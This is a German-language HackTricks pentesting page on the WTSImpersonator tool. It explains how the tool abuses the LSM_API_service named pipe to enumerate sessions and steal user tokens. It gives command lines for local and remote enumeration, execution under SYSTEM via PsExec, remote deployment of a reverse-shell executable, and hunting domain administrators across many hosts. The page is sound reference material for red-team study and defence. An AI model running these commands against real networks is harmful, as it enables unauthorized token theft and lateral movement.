{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Das **WTS Impersonator**-Tool nutzt die **"\\pipe\LSM_API_service"** RPC Named Pipe, um heimlich angemeldete Benutzer zu enumerieren und deren Tokens zu übernehmen, wodurch traditionelle Token-Impersonation-Techniken umgangen werden. Dieser Ansatz erleichtert nahtlose laterale Bewegungen innerhalb von Netzwerken. Die Innovation hinter dieser Technik wird **Omri Baso** zugeschrieben, dessen Arbeit auf [GitHub](https://github.com/OmriBaso/WTSImpersonator) zugänglich ist.

### Kernfunktionalität
Das Tool funktioniert durch eine Abfolge von API-Aufrufen:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Schlüsselmodule und Verwendung
- **Benutzer Auflisten**: Lokale und remote Benutzerauflistung ist mit dem Tool möglich, indem Befehle für jedes Szenario verwendet werden:
- Lokal:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remote, indem eine IP-Adresse oder ein Hostname angegeben wird:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Befehle Ausführen**: Die Module `exec` und `exec-remote` benötigen einen **Service**-Kontext, um zu funktionieren. Die lokale Ausführung benötigt einfach die WTSImpersonator ausführbare Datei und einen Befehl:
- Beispiel für lokale Befehlsausführung:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kann verwendet werden, um einen Service-Kontext zu erhalten:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote-Befehlsausführung**: Beinhaltet das Erstellen und Installieren eines Services remote, ähnlich wie PsExec.exe, was die Ausführung mit entsprechenden Berechtigungen ermöglicht.
- Beispiel für remote Ausführung:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Benutzerjagd-Modul**: Zielt auf spezifische Benutzer über mehrere Maschinen ab und führt Code unter ihren Anmeldeinformationen aus. Dies ist besonders nützlich, um Domain-Administratoren mit lokalen Administratorrechten auf mehreren Systemen anzuvisieren.
- Anwendungsbeispiel:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterstützen</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
{% endhint %}
